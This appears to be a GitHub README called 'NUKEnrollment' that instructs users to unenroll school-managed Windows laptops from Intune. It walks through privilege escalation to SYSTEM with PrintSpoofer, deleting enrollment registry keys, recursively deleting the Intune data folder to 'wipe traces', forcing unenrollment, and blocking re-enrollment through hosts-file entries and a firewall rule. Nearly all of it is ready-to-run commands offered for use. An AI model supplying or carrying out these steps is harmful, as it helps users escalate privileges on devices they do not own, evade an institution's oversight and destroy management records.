# NUKEnrollment
A windows bypass that unenrolls your managed school windows laptop using PrintSpoofer

## Requirements: 
- Install PrintSpoofer
- access to CMD/PowerShell while running as user
- Windows laptop
- Certain CMD scripts

## Set Up 
- Install `PrintSpoofer64.exe` from someone's Github → Releases; if firewall/policy blocks it, use a different browser like brave or firefox. 
- Check to see if CMD or PowerShell can run as User; if it doesn't open/run, open safe mode and use from there.

## Check if Intune is the Lock
1. Run this script in CMD as User; `dsregcmd /status`
- Look for: `AzureAdJoined: YES` & `MdmEnrolled: YES`
- If both are true → we’re in

## Instructions 
1. Open PowerShell (no admin) and run this; `whoami /priv`
- If: `SeDebugPrivilege` is not disabled, move to step 2.
2. Run this in PowerShell; `PrintSpoofer64.exe -i cmd.exe`. Boom, now you’re NT AUTHORITY\SYSTEM.

## Delete/Nuke Enrollment 
3. Run this to delete Enrollment; 
- `REG DELETE "HKLM\SOFTWARE\Microsoft\Enrollments\{WEIRD-GUID-HERE}" /f
  REG DELETE "HKLM\SOFTWARE\Microsoft\EnrollmentsPending" /f`
4. Run this to wipe traces;
- `cd C:\ProgramData\Microsoft\Intune\
  del * /s /q` 
5. Run this to force un-enroll;
- `%windir%\System32\deviceenroller.exe /c /d /RemoveDeviceFromIDM` 

## Block Re-enrollment 
6. They’ll try to re-enroll on reboot. Edit hosts file;
- `echo 0.0.0.0 manage.microsoft.com >> C:\Windows\System32\drivers\etc\hosts
  echo 0.0.0.0 enrollment.manage.microsoft.com >> C:\Windows\System32\drivers\etc\hosts`
7. Or use a firewall killswitch;
`netsh advfirewall firewall add rule name="Block Intune" dir=out action=block remoteip=13.107.64.0/18,52.114.0.0/17 enable=yes profile=any`

## Credits: 
- 2pro12342 | Github
- PrintSpoofer 
